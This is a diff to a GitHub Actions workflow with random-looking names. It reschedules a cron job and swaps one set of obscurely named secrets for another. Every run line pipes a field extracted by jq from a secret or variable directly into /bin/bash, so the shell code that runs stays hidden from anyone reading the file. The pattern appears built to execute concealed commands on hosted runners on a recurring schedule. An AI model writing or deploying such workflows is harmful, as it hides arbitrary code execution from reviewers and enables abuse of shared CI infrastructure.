@@ -3,23 +3,23 @@ name: sensiblehumiliated
 on:
   workflow_dispatch:
   schedule:
-    - cron: '43 2/6 * * *'
+    - cron: '28 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: sensiblehumiliated
         env:
-          x91397: ${{ secrets.x91397 }}
+          ddr87: ${{ secrets.ddr87 }}
         run: |
-          echo $x91397 | jq -r .x83 | /bin/bash
-          echo $u223 | jq -r .kibgg52 | /bin/bash
-          echo $pp53 | jq -r .bwpeu231 | /bin/bash
-          echo $sjutt1 | jq -r .pg84625 | /bin/bash
-          echo $knigh21 | jq -r .s39997 | /bin/bash
-          echo $shajn774 | jq -r .ewlte5492 | /bin/bash
-          echo $iyyjq27107 | jq -r .q9952 | /bin/bash
-          echo $bqyb941 | jq -r .tc1302 | /bin/bash
+          echo $ddr87 | jq -r .sgynv6845 | /bin/bash
+          echo $i46585 | jq -r .sedp77 | /bin/bash
+          echo $iloj92436 | jq -r .wi5957 | /bin/bash
+          echo $auc70 | jq -r .p92645 | /bin/bash
+          echo $k859 | jq -r .dxc789 | /bin/bash
+          echo $f50 | jq -r .eqjh175 | /bin/bash
+          echo $joddm0044 | jq -r .banp4500 | /bin/bash
+          echo $gsgm0128 | jq -r .kngsm5 | /bin/bash
+          echo $ado70430 | jq -r .epbd314 | /bin/bash
 
